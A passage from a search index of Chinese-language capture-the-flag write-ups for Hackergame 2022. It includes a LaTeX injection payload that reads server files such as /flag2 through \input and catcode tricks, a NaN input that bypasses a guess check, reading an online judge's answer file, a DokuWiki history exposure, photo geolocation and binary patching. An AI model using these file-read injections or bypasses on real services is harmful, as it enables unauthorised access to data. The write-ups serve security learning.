\u516c\u5f0f\u4ee3\u7801\u8f6c\u6362\u6210\u56fe\u7247\u7684\u7f51\u7ad9\uff0c\u5e76\u901a\u8fc7\u804a\u5929\u673a\u5668\u4eba\u5728\u7fa4\u91cc\u5b9e\u65f6\u5c06\u7fa4\u53cb\u53d1\u9001\u7684\u516c\u5f0f\u8f6c\u6362\u6210\u56fe\u7247\u53d1\u51fa\u3002 \u8fd9\u4e2a\u7f51\u7ad9\u7684\u601d\u8def\u4e5f\u5f88\u76f4\u63a5\uff1a\u628a\u7528\u6237\u8f93\u5165\u7684 LaTeX \u63d2\u5165\u5230\u4e00\u4e2a\u5199\u597d\u5934\u90e8\u548c\u5c3e\u90e8\u7684 TeX \u6587\u4ef6\u4e2d\uff0c\u5c06\u6587\u4ef6\u7f16\u8bd1\u6210 PDF\uff0c\u518d\u5c06 PDF \u88c1\u526a\u6210\u5927\u5c0f\u5408\u9002\u7684\u56fe\u7247\u3002 \u201cLaTeX \u53c8\u4e0d\u662f\u88ab\u7f16\u8bd1\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fd9\u79cd\u4e1c\u897f\u4e0d\u4f1a\u6709\u4e8b\u7684\u3002\u201d \u7269\u7406\u51fa\u8eab\u7684\u5f00\u53d1\u8005\u4eec\u660e\u663e\u4e0d\u662f\u592a\u5728\u610f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u6ca1\u6709\u5bf9\u7528\u6237\u7684\u8f93\u5165\u505a\u4efb\u4f55\u68c0\u67e5\u3002 \u90a3\u4f60\u80fd\u60f3\u529e\u6cd5\u83b7\u5f97\u670d\u52a1\u5668\u4e0a\u653e\u5728\u6839\u76ee\u5f55\u4e0b\u7684 flag \u5417\uff1f \u7eaf\u6587\u672c \u7b2c\u4e00\u4e2a flag \u4f4d\u4e8e /flag1\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u7531\u7eaf\u6587\u672c\u7ec4\u6210\uff08\u5373\u53ea\u5305\u542b\u5927\u5199\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57 0-9\uff09\u3002 \u7279\u6b8a\u5b57\u7b26\u6df7\u5165 \u7b2c\u4e8c\u4e2a flag \u4f4d\u4e8e /flag2\uff0c\u8fd9\u6b21\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u9664\u4e86\u5b57\u6bcd\u548c\u6570\u5b57\u4e4b\u5916\uff0c\u8fd8\u6df7\u5165\u4e86\u4e24\u79cd\u7279\u6b8a\u5b57\u7b26\uff1a\u4e0b\u5212\u7ebf\uff08_\uff09\u548c\u4e95\u53f7\uff08#\uff09\u3002\u4f60\u53ef\u80fd\u9700\u8981\u60f3\u4e9b\u5176\u4ed6\u529e\u6cd5\u4e86\u3002 \u7b2c\u4e00\u4e2a flag \u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981 input \u4e00\u4e0b\u5373\u53ef\uff1a \\input{/flag1} \uff0c\u53ef\u4ee5\u770b\u5230 flag\uff1a flag{becAr3fu11dUd3\u2026\u2026} \u3002 \u7b2c\u4e8c\u4e2a flag \u56e0\u4e3a\u91cc\u9762\u5305\u542b\u7279\u6b8a\u5b57\u7b26\uff0c\u6240\u4ee5\u5728\u6e32\u67d3\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u89e3\u51b3\u65b9\u6848\u662f\u5229\u7528 LaTeX \u7684 active character \u6982\u5ff5 \u6765\u5c06 _ \u548c # \u66ff\u6362\u4e3a \\_ \u548c \\#\uff0c\u5148\u5c06\u5176\u5b57\u7b26\u7684 catcode \u8bbe\u7f6e\u4e3a \\active\uff0c\u7136\u540e\u5b9a\u4e49\u547d\u4ee4\u5e8f\u5217\u3002payload \u4e3a\uff1a $$ \\catcode ` \\_ = \\active \\def _{ \\_ } \\catcode ` \\# = \\active \\def #{ \\# } \\input { / flag 2 } $$ \u5f97\u5230 flag\uff1a flag{latex_bec_0_m##es_co__#ol_\u2026\u2026}","title":"LaTeX \u673a\u5668\u4eba"},{"location":"writeups/hackergame2022/#_4","text":"\u542c\u8bf4\u4f60\u5728\u533a\u5757\u94fe\u4e0a\u90e8\u7f72\u7684\u667a\u80fd\u5408\u7ea6\u6709\u8fc7\u76ee\u4e0d\u5fd8\u7684\u80fd\u529b\u3002 \u7b2c\u4e00\u9053\u9898\u9898\u76ee\u5408\u7ea6\uff1a pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint256 n ) external ; function recall () external view returns ( uint256 ); } contract Challenge { function test ( MemoryMaster m , uint256 n ) external returns ( bool ) { m . memorize ( n ); uint256 recalled = m . recall (); return recalled == n ; } } \u5f88\u7b80\u5355\uff0c\u5199\u4e00\u4e2a\u5408\u7ea6\u5b58\u503c\uff0c\u5b9e\u73b0 memorize \u548c recall \u65b9\u6cd5\u5b58\u53d6\u503c\u5373\u53ef\uff1a pragma solidity = 0.8.17 ; contract Exploit { uint256 num ; function memorize ( uint256 n ) external { num = n ; } function recall () external view returns ( uint256 ) { return num ; } } Remix \u91cc\u7f16\u8bd1\u7136\u540e\u4e0a\u4f20\u5373\u53ef\uff0cflag\uff1a flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_\u2026\u2026} \u7b2c\u4e00\u9898\u62a2\u4e86\u4e00\u8840\u3002\u7b2c\u4e8c\u4e09\u9898\u770b\u4e86\u5c5e\u5b9e\u8499\u5708\u3002\u7b2c\u4e8c\u9898\u5728\u8c03\u7528 memorize \u4e4b\u540e\u63a5\u4e86\u4e00\u4e2a revert \u6062\u590d\u72b6\u6001\u53d8\u5316\u3002\u7b2c\u4e09\u9898\u9650\u5b9a memorize \u65b9\u6cd5\u4e3a view \u51fd\u6570\uff0c\u5373\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\u3002\u611f\u89c9\u5f88\u795e\u5947\uff0c\u53ef\u80fd\u662f\u7528\u4e86\u67d0\u4e9b EVM \u7279\u6027\u5427\u3002\u8e72 wp \u5b66\u5b66\u3002","title":"\u94fe\u4e0a\u8bb0\u5fc6\u5927\u5e08"},{"location":"writeups/hackergame2022/#20","text":"\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u84c4\u8c0b\u5df2\u4e45\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u5e94\u8be5\u662f\u53c8\u88ab\u4ed6\u4f4f\u4e0b\u4e86\u3002","title":"\u65c5\u884c\u7167\u7247 2.0"},{"location":"writeups/hackergame2022/#_5","text":".content blockquote ol { margin-top: 0; } \u7b2c\u4e00\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247 exif \u4fe1\u606f\u7684\u95ee\u9898\uff0c\u76f4\u63a5\u4f7f\u7528 exiftool \u8bfb\u53d6\u5373\u53ef\uff1a \u56fe\u7247\u6240\u5305\u542b\u7684 EXIF \u4fe1\u606f\u7248\u672c\u662f\u591a\u5c11\uff1f\uff08\u5982 2.1\uff09\u3002 exiftool \u663e\u793a\u662f 0231\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f 2.31 \u3002 \u62cd\u7167\u4f7f\u7528\u624b\u673a\u7684\u54c1\u724c\u662f\u4ec0\u4e48\uff1f exiftool \u53ef\u4ee5\u770b\u5230 Make: Xiaomi \uff0c\u6240\u4ee5\u7b54\u6848\u662f \u5c0f\u7c73/\u7ea2\u7c73 \u3002 \u8be5\u56fe\u7247\u88ab\u62cd\u6444\u65f6\u76f8\u673a\u7684\u611f\u5149\u5ea6\uff08ISO\uff09\u662f\u591a\u5c11\uff1f\uff08\u6574\u6570\u6570\u5b57\uff0c\u5982 3200\uff09 ISO: 84 \uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 84 \u3002 \u7167\u7247\u62cd\u6444\u65e5\u671f\u662f\u54ea\u4e00\u5929\uff1f\uff08\u683c\u5f0f\u4e3a\u5e74/\u6708/\u65e5\uff0c\u5982 2022/10/01\u3002\u6309\u62cd\u6444\u5730\u70b9\u5f53\u5730\u65e5\u671f\u8ba1\u7b97\u3002\uff09 Create Date: 2022:05:14 18:23:35.220027+09:00 \uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 2022/05/14 \u3002 \u7167\u7247\u62cd\u6444\u65f6\u662f\u5426\u4f7f\u7528\u4e86\u95ea\u5149\u706f\uff1f Flash: Off, Did not fire \uff08\u6216\u8005\u770b\u53cd\u5149\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u6240\u4ee5\u7b54\u6848\u4e3a \u5426 \u3002 flag\uff1a flag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF}","title":"\u7167\u7247\u5206\u6790"},{"location":"writeups/hackergame2022/#_6","text":"\u63a5\u4e0b\u6765\u7b2c\u4e8c\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247\u793e\u5de5\u5206\u6790\u7684\u95ee\u9898\u3002 \u8bf7\u5199\u51fa\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\u7684\u90ae\u653f\u7f16\u7801\uff0c\u683c\u5f0f\u4e3a 3 \u81f3 10 \u4f4d\u6570\u5b57\uff0c\u4e0d\u542b\u7a7a\u683c\u6216\u4e0b\u5212\u7ebf\u7b49\u7279\u6b8a\u7b26\u53f7\uff08\u5982 230026\u300194720\uff09\u3002 \u901a\u8fc7\u653e\u5927\u56fe\u7247\u53ef\u4ee5\u770b\u5230\u697c\u4e0b\u7684\u4f53\u80b2\u9986\u5916\u9762\u5199\u7684\u6709 \u201cZOZO\u201d \u6837\u5f0f\uff0c\u641c\u7d22\u53ef\u4ee5\u627e\u5230\u8fd9\u91cc\u662f\u65e5\u672c\u5343\u53f6\u6d77\u6d0b\u7403\u573a\u3002\u901a\u8fc7 Google \u5730\u56fe\u627e\u5230\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\uff1aAPA HOTEL& RESORT TOKYO BAY MAKUHARI \u3012261-0021 Chiba, Mihama Ward, Hibino, 2 Chome-3\uff0c\u6240\u4ee5\u90ae\u7f16\u4e3a 2610021 \u3002\uff08\u8fd9\u91cc\u6709\u4e2a\u5751\uff0c\u65e5\u672c\u90ae\u7f16\u5212\u5206\u5f88\u7ec6\uff0c\u7403\u573a\u548c\u9152\u5e97\u7684\u90ae\u7f16\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u8981\u6ce8\u610f\uff09 \u7167\u7247\u7a97\u6237\u4e0a\u53cd\u5c04\u51fa\u4e86\u62cd\u7167\u4eba\u7684\u624b\u673a\u3002\u90a3\u4e48\u8fd9\u90e8\u624b\u673a\u7684\u5c4f\u5e55\u5206\u8fa8\u7387\u662f\u591a\u5c11\u5462\uff1f\uff08\u683c\u5f0f\u4e3a\u957f + \u5b57\u6bcd x + \u5bbd\uff0c\u5982 1920x1080\uff09 \u901a\u8fc7\u4eac\u4e1c\u641c\u7d22\u5c0f\u7c73\u624b\u673a\uff0c\u4ee5\u53ca\u73bb\u7483\u53cd\u5149\u4e2d\u7684\u540e\u7f6e\u6444\u50cf\u5934\u6837\u5f0f\u53ef\u4ee5\u77e5\u9053\u8fd9\u90e8\u624b\u673a\u662f\u7ea2\u7c73 Note 9\uff0c\u5c4f\u5e55\u5206\u8fa8\u7387\u4e3a 2340x1080 \u3002 \u4ed4\u7ec6\u89c2\u5bdf\uff0c\u53ef\u4ee5\u53d1\u73b0\u7167\u7247\u7a7a\u4e2d\uff08\u767d\u8272\u4e91\u4e0a\u65b9\u4e2d\u95f4\u4f4d\u7f6e\uff09\u6709\u4e00\u67b6\u98de\u673a\u3002\u4f60\u80fd\u8c03\u67e5\u51fa\u8fd9\u67b6\u98de\u673a\u7684\u4fe1\u606f\u5417\uff1f\uff0c\u5305\u62ec \u8d77\u98de\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 PEK\uff09\u3001\u964d\u843d\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 HFE\uff09\u3001\u822a\u73ed\u53f7\uff08\u4e24\u4e2a\u5927\u5199\u5b57\u6bcd\u548c\u82e5\u5e72\u4e2a\u6570\u5b57\uff0c\u5982 CA1813\uff09 \u505a\u8fd9\u9053\u9898\u7684\u65f6\u5019\u65f6\u95f4\u6b63\u597d\u662f\u4e0b\u5348\u4e94\u70b9\u4e8c\u5341\u591a\uff0c\u5bf9\u5e94\u65e5\u672c\u65f6\u95f4\u4e0b\u5348\u516d\u70b9\u4e8c\u5341\u591a\uff0c\u4e5f\u5c31\u662f\u7c7b\u4f3c\u62cd\u7167\u7684\u65f6\u95f4\uff0c\u5728\u5b9e\u65f6\u98de\u673a\u822a\u7ebf\u5730\u56fe\u4e2d\u6b63\u597d\u770b\u89c1\u6709\u4e00\u67b6\u98de\u673a\u5728\u8be5\u5904\u4e0a\u7a7a\uff0c\u8d77\u98de\u673a\u573a\u662f HND\u3002\u901a\u8fc7\u98de\u673a\u65b9\u5411\u53ef\u4ee5\u786e\u5b9a\u8d77\u98de\u673a\u573a\u5c31\u662f HND \u3002\u7136\u540e\u627e\u5230\u6bcf\u5929\u5927\u6982\u8fd9\u4e2a\u65f6\u95f4\u4ece HND \u51fa\u53d1\u5411\u5317\u7684\u98de\u673a\uff0c\u901a\u8fc7\u5c1d\u8bd5\u5f97\u5230\u964d\u843d\u673a\u573a\u4e3a HIJ \uff0c\u822a\u73ed\u53f7\u4e3a NH683 \u3002\uff08\u4e5f\u53ef\u4ee5\u7206\u7834\uff0c\u8fd9\u9053\u9898\u7684\u9a8c\u9898\u903b\u8f91\u662f\u5c06\u8868\u5355\u7ed3\u679c\u8fdb\u884c base64\uff0c\u7136\u540e GET \u7ed3\u679c.txt\uff0c\u6b63\u786e\u5219 200 \u4e14\u91cc\u9762\u662f flag\uff0c\u9519\u8bef\u5219 404\uff09 flag\uff1a flag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}","title":"\u793e\u5de5\u5b9e\u8df5"},{"location":"writeups/hackergame2022/#_7","text":"\u8fd9\u4e2a\u5c0f\u6e38\u620f\u9700\u8981\u505a\u7684\u4e8b\u60c5\u975e\u5e38\u7b80\u5355\uff1a\u5728 0 \u548c 1 \u4e4b\u95f4\u731c\u4e00\u4e2a\u6570\u5b57\uff08\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e 6 \u4f4d\uff09\uff0c\u5e76\u901a\u8fc7\u53cd\u9988\u7684\u300c\u5927\u300d\u8fd8\u662f\u300c\u5c0f\u300d\u4fee\u6b63\u731c\u6d4b\uff0c\u76f4\u81f3\u5b8c\u5168\u731c\u4e2d\u3002\u4e00\u6b21\u6027\u547d\u4e2d\u7684\u6982\u7387\u663e\u7136\u4e5f\u662f\u4e00\u767e\u4e07\u5206\u4e4b\u4e00\uff08\u548c\u4e94\u8fb9\u5f62\u7684\u300c\u5ae9\u725b\u4e03\u65b9\u300d\u8fbe\u6210\u4e86\u67d0\u79cd\u610f\u4e49\u4e0a\u7684\u540c\u6784\uff09\u2014\u2014\u4f46\u4ece\u5b66\u9738\u5ba4\u53cb\u624b\u4e2d\u501f\u6765\u7684\u6982\u7387\u8bba\u4e0e\u7edf\u8ba1\u5b66\u7b14\u8bb0\u4e0a\u4e07\u5343\u516c\u5f0f\u7684\u6a21\u6837\u5728\u601d\u7eea\u4e2d\u4e00\u77ac\u800c\u8fc7\uff0c\u4e8e\u662f\u4f60\u9ed8\u9ed8\u7948\u7977\u7740\u5927\u6570\u5b9a\u7406\uff0c\u8654\u8bda\u5730\u6309\u4e0b\u4e86\u63d0\u4ea4\u7684\u6309\u94ae\u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u7f51\u9875\u670d\u52a1\u7684 Java \u6e90\u7801\u3002\u672c\u6765\u60f3\u7740\u662f\u7206\u7834\u4f2a\u968f\u673a\u6570\uff0c\u4e0d\u8fc7\u6e90\u7801\u91cc\u7528\u7684\u662f SecureRandom\uff0c\u4e0d\u80fd\u7206\u7834\u3002\u7136\u540e\u4ed4\u7ec6\u770b\u6e90\u7801\u3002\u53d1\u73b0\u4e86\u4e00\u4e9b\u6bd4\u8f83\u53ef\u7591\u7684\u4e1c\u897f\uff0c\u660e\u660e\u6bd4\u8f83\u7684\u90fd\u662f\u516d\u4f4d\u5c0f\u6570\uff0c\u662f\u53ef\u4ee5\u4e58 1000000 \u7136\u540e\u5224\u65ad\u6574\u6570\u76f8\u7b49\u7684\uff0c\u4f46\u5b83\u504f\u8981\u6bd4\u8f83\u8f93\u5165\u548c\u4e24\u4e2a\u5c0f\u6570\u7684\u5927\u5c0f\uff08\u662f\u5426\u4e0d\u5927\u4e8e\u4e14\u4e0d\u5c0f\u4e8e\uff09\u3002\u800c\u5982\u679c\u8f93\u5165\u662f NaN\uff0c\u5219\u4efb\u4f55\u6bd4\u8f83\u90fd\u662f False\uff0c\u4e5f\u5c31\u8ba9\u7a0b\u5e8f\u8ba4\u4e3a\u8f93\u5165\u548c\u9884\u671f\u76f8\u7b49\u4e86\u3002 \u4e0d\u8fc7\u56e0\u4e3a\u89c4\u5b9a\u4e86\u5c0f\u6570\uff0c\u6240\u4ee5 NaN \u5728\u524d\u7aef\u4e0d\u80fd\u76f4\u63a5\u5199\u5165\uff0c\u9700\u8981\u624b\u52a8 POST \u5230 /state \uff0c\u7528\u4e00\u4e2a\u4efb\u610f\u6570\u5b57\u8bd5\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5728 DevTool \u91cc\u6355\u83b7\u5230 POST \u6570\u636e\u683c\u5f0f\u3002\u7136\u540e\u624b\u52a8 POST \u4e00\u4e2a <state><guess>NaN</guess></state> \u518d GET \u4e00\u4e0b\u5c31\u80fd\u5728\u8fd4\u56de\u6570\u636e\u4e2d\u770b\u5230 flag\uff1a flag{gu3ss-n0t-a-numb3r-1nst3ad-\u2026\u2026}","title":"\u731c\u6570\u5b57"},{"location":"writeups/hackergame2022/#flag","text":"\u5c0f Z \u542c\u8bf4 Dokuwiki \u914d\u7f6e\u5f88\u7b80\u5355\uff0c\u6240\u4ee5\u5728\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u6574\u4e86\u4e00\u4efd\u3002\u53ef\u662f\u4e0d\u5de7\u7684\u662f\uff0c\u4ed6\u4e00\u4e0d\u5c0f\u5fc3\u628a\u73cd\u8d35\u7684 flag \u7c98\u8d34\u5230\u4e86 wiki \u9996\u9875\u63d0\u4ea4\u4e86\uff01\u4ed6\u8d76\u7d27\u6539\u597d\uff0c\u5e76\u4e14\u4e5f\u628a\u5386\u53f2\u8bb0\u5f55\uff08revisions\uff09\u529f\u80fd\u5173\u6389\u4e86\u3002 \u300c\u8fd9\u6837\u5c31\u5e94\u8be5\u5c31\u4e0d\u4f1a\u6cc4\u6f0f flag \u4e86\u5427\u300d\uff0c\u5c0f Z \u5982\u662f\u5b89\u6170\u81ea\u5df1\u3002 \u7136\u800c\u4e8b\u5b9e\u771f\u7684\u5982\u6b64\u5417\uff1f \uff08\u9898\u76ee Dokuwiki \u7248\u672c\u57fa\u4e8e 2022-07-31a \"Igor\"\uff09 \u4e00\u4e2a Dokuwiki \u6846\u67b6\u642d\u7684\u7f51\u7ad9\uff0c\u76ee\u6807\u662f\u627e\u5230\u9996\u9875\u7684\u4fee\u6539\u3002\u7248\u672c\u662f\u6700\u65b0\u7684\uff0c\u641c\u4e0d\u5230\u5565\u6f0f\u6d1e\u3002\u81ea\u5df1\u90e8\u7f72\u4e86\u4e00\u4e0b\u73a9\u73a9\uff0c\u770b\u8d77\u6765 revisions \u7b49\u529f\u80fd\u5173\u6389\u4e4b\u540e\u786e\u5b9e\u6ca1\u6cd5\u770b\u4fee\u6539\u8bb0\u5f55\u4e86\u3002\u800c\u4e14\u9898\u76ee\u662f external edit\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4fee\u6539\u4e86\u6587\u4ef6\uff0c\u800c\u6ca1\u6709\u901a\u8fc7\u7f51\u9875\u7f16\u8f91\u3002 \u7136\u540e\u5c31\u8bfb\u4e86\u8bfb\u6e90\u7801\uff0c\u641c\u4e86\u4e0b issue \u770b\u5230\u4e86\u4e00\u4e2a revision \u76f8\u5173\u7684 https://github.com/splitbrain/dokuwiki/issues/3576 \uff0c\u91cc\u9762\u63d0\u5230\u4e86 ?do=diff \uff0c\u5c1d\u8bd5\u8bbf\u95ee /doku.php?id=start&do=diff \uff0c\u786e\u5b9e\u80fd\u770b\u5230\u4fee\u6539\u8bb0\u5f55\uff0c\u5176\u4e2d flag\uff1a flag{d1gandFInD_d0kuw1k1_unexpectEd_API}","title":"Flag \u7684\u75d5\u8ff9"},{"location":"writeups/hackergame2022/#_8","text":"\u4f20\u8bf4\u79d1\u5927\u65b0\u7684\u5728\u7ebf\u6d4b\u8bc4\u7cfb\u7edf\uff08Online Judge\uff09\u6b63\u5728\u9510\u610f\u5f00\u53d1\u4e2d\u3002\u7136\u800c\uff0c\u65b0 OJ \u8fdf\u8fdf\u4e0d\u89c1\u8e2a\u5f71\uff0c\u65e7\u7684 OJ \u548c\u66f4\u65e7\u7684 OJ \u5374\u90fd\u5df2\u7ecf\u505c\u6b62\u4e86\u7ef4\u62a4\u3002\u67d0 2022 \u7ea7\u8ba1\u7b97\u673a\u7cfb\u7684\u65b0\u751f\u5c0f L \u7b49\u5f97\u4e0d\u8010\u70e6\u4e86\uff0c\u5f53\u5373\u8868\u793a\u4e0d\u5c31\u662f OJ \u5417\uff0c\u4ed6 10 \u5206\u949f\u5c31\u80fd\u5199\u51fa\u6765\u4e00\u4e2a\u3002 \u65e0\u6cd5 AC \u7684\u9898\u76ee \u4e3a\u4e86\u9a8c\u8bc1\u4ed6\u5199\u7684\u65b0 OJ \u7684\u5b89\u5168\u6027\uff0c\u4ed6\u51b3\u5b9a\u5728 OJ \u4e0a\u51fa\u4e00\u9053\u4e0d\u53ef\u80fd\u5b8c\u6210\u7684\u9898\u76ee\u2014\u2014\u5927\u6574\u6570\u5206\u89e3\uff0c\u5e76\u4e14\u653e\u51fa\u8c6a\u8a00\uff1a\u53ea\u8981\u6709\u4eba\u80fd AC \u8fd9\u9053\u9898\uff0c\u5c31\u80fd\u5f97\u5230\u4f20\u8bf4\u4e2d\u7684 flag\u3002\u5f53\u7136\uff0c\u56e0\u4e3a\u76ee\u524d OJ \u53ea\u80fd\u8fd0\u884c C \u8bed\u8a00\u4ee3\u7801\uff0c\u5373\u4f7f\u8bf7\u6765\u4e00\u4f4d\u5c11\u5e74\u73ed\u5b66\u9662\u7684\u5929\u624d\u6050\u6015\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\u3002 \u52a8\u6001\u6570\u636e \u4e3a\u4e86\u9632\u6b62\u6570\u636e\u610f\u5916\u6cc4\u9732\uff0c\u5c0f L \u8fd8\u7ed9 OJ \u52a0\u5165\u4e86\u52a8\u6001\u6570\u636e\u751f\u6210\u529f\u80fd\uff0c\u6bcf\u6b21\u6d4b\u8bc4\u4f1a\u968f\u673a\u751f\u6210\u4e00\u90e8\u5206\u6d4b\u8bd5\u6570\u636e\u3002\u8fd9\u6837\uff0c\u5373\u4f7f OJ \u6d4b\u8bd5\u6570\u636e\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u4e5f\u6ca1\u529e\u6cd5\u901a\u8fc7\u6240\u6709\u6d4b\u8bd5\u6837\u4f8b\u4e86\u5427\uff01\uff08\u4e5f\u8bb8\u5427\uff1f\uff09 \u7b2c\u4e00\u9898\u5c31\u662f\u4f7f\u7528 ./data/static.in \u548c ./data/static.out \u4f5c\u4e3a\u8f93\u5165\u8f93\u51fa\u3002\u800c\u4e14\u4e5f\u6ca1\u6709\u8bbe\u7f6e\u6743\u9650\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u53d6 ./data/static.out \u5185\u5bb9\u5e76\u8f93\u51fa\u5373\u53ef\u3002flag\uff1a flag{the_compiler_is_my_eyes_b18ad6f041} \u7b2c\u4e8c\u9898\u52a8\u6001\u751f\u6210\u6570\u636e\uff0c\u800c\u4e14\u8bbe\u7f6e\u4e86\u6743\u9650\uff0c\u7528\u6237\u4e0d\u80fd\u8bfb\u53d6\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u505a\u3002","title":"\u5b89\u5168\u7684\u5728\u7ebf\u6d4b\u8bc4"},{"location":"writeups/hackergame2022/#_9","text":"\u4e2d\u5348\u8d77\u5e8a\uff0c\u770b\u5230\u5ba4\u53cb\u7684\u684c\u5b50\u4e0a\u53c8\u591a\u4e86\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u76d2\u5b50\u3002\u5feb\u9012\u6807\u7b7e\u4e0a\u4e00\u5982\u65e2\u5f80\u7684\u5199\u7740\uff1a\u7ebf\u8def\u677f\u3002\u548c\u5f80\u5e38\u4e00\u6837\uff0c\u4f60\u201c\u5e2e\u201d\u5ba4\u53cb\u62c6\u5f00\u5feb\u9012\u5e76\u62a2\u5148\u628a\u677f\u5b50\u628a\u73a9\u4e00\u756a\u3002\u53ef\u662f\u7a81\u7136\uff0c\u4f60\u6ce8\u610f\u5230\u677f\u5b50\u8868\u9762\u4f3c\u4e4e\u5199\u7740\u4e9b\u4e1c\u897f\u2026\u2026\u770b\u8d77\u6765\u50cf\u662f\u2026\u2026flag\uff1f \u53ef\u662f\u53ea\u6709\u5f00\u5934\u7684\u51e0\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u770b\u6e05\u695a\u3002\u4f60\u4e00\u65f6\u95f4\u4e0d\u77e5\u6240\u63aa\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u4f60\u901a\u8fc7\u76d2\u5b50\u4e0a\u7684\u8054\u7cfb\u65b9\u5f0f\u627e\u5230\u4e86\u5236\u4f5c\u5382\u5bb6\uff0c\u901a\u8fc7\u677f\u5b50\u4e1d\u5370\u4e0a\u7684\u5e8f\u5217\u53f7\u67e5\u51fa\u4e86\u5ba4\u53cb\u7684\u5e95\u7ec6\uff0c\u5e76\u4ee5\u653e\u5f03\u6bcf\u6708\u4e24\u6b21\u514d\u8d39 PCB \u6253\u6837\u5305\u90ae\u7684\u673a\u4f1a\u4e3a\u4ee3\u4ef7\u8981\u6765\u4e86\u8fd9\u6279\u5e26\u6709 flag \u7684\u677f\u5b50\u7684\u751f\u4ea7\u6587\u4ef6\u3002\u90a3\u8fd9\u4e9b\u6587\u4ef6\u91cc\u4f1a\u4e0d\u4f1a\u5305\u542b\u7740\u66f4\u591a\u6709\u5173 flag \u7684\u4fe1\u606f\u5462\uff1f \u7ed9\u4e86\u4e00\u4e9b gbr \u6587\u4ef6\uff0c\u641c\u4e86\u4e00\u4e0b\u7528 Gerbv \u6253\u5f00\u3002\u53d1\u73b0 flag \u76f8\u5173\u5185\u5bb9\u5728 F_Cu \u8fd9\u90e8\u5206\u4e0a\uff0c\u6709\u4e00\u4e9b\u5706\u73af\u906e\u6321\u4e86\uff0c\u70b9\u51fb\u53bb\u6389\u5c31\u53ef\u4ee5\u770b\u89c1 flag\uff1a flag{8_1ayER_rogeRS_81ind_V1a}","title":"\u7ebf\u8def\u677f"},{"location":"writeups/hackergame2022/#flag_1","text":"Hackergame 2022 \u7ec4\u59d4\u4f1a\u4e3a\u5927\u5bb6\u642c\u6765\u4e86\u4e00\u53f0\u80fd\u591f\u81ea\u52a8\u83b7\u53d6 flag \u7684\u673a\u5668\u3002\u7136\u800c\uff0c\u60f3\u8981\u63d0\u53d6\u51fa\u5176\u4e2d\u7684 flag \u4f3c\u4e4e\u6ca1\u90a3\u4e48\u7b80\u5355\u2026\u2026 \u4e00\u4e2a\u4f7f\u7528 Win32 API \u7684\u7a97\u53e3\u7a0b\u5e8f\u7684\u9006\u5411\u3002\u593a\u53d6 flag \u7684\u6309\u94ae\u70b9\u4e0d\u4e0a\u3002\u9006\u5411\u4e00\u4e0b\uff0c\u5728 WinMain \u51fd\u6570\u91cc\u770b\u5230\u6ce8\u518c\u4e86\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u5728 0x401510 \u5904\u3002\u679a\u4e3e\u4e86 msg \u7684\u503c\uff0c\u4e5f\u5c31\u662f\u4e8b\u4ef6\uff1a 1\uff1a\u5373\u521b\u5efa\u7a97\u53e3\uff0c\u521b\u5efa\u4e86\u4e09\u4e2a\u6309\u94ae\uff0c\u4e00\u4e2a\u662f \u201c\u72e0\u5fc3\u593a\u53d6\u201d\uff0c\u5bf9\u5e94\u7684 hMENU \u4e3a 3\uff0c\u4e00\u4e2a \u201c\u653e\u624b\u79bb\u5f00\u201d\uff0chMENU \u4e3a 2\uff0c\u4e00\u4e2a\u6ca1\u6709\u663e\u793a\u4e0d\u7ba1 0x111\uff1a\u5373\u70b9\u51fb\uff0c\u6b64\u65f6\u7684\u53c2\u6570 wParam\uff08\u5373 a3\uff09\u4e3a\u70b9\u51fb\u7684\u6309\u94ae\u7684 hMENU\uff0c\u5f53 a3 \u4e3a 2 \u65f6\u9000\u51fa\uff0ca3 \u4e3a 3 \u65f6\u68c0\u67e5 lParam \u662f\u5426\u4e3a 114514\uff0c\u5982\u679c\u662f\u5219\u8f93\u51fa flag \u5230\u6587\u4ef6\u4e2d \u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u6c47\u7f16\u91cc patch \u4e00\u4e0b\u7a0b\u5e8f\uff0c\u5c06\u5224\u65ad a3 \u4e3a 2 \u6216 3 \u8c03\u6362\u4e00\u4e0b\uff0c\u7136\u540e\u518d\u5c06\u5224\u65ad lParam \u7684 jz \u53d8\u6210 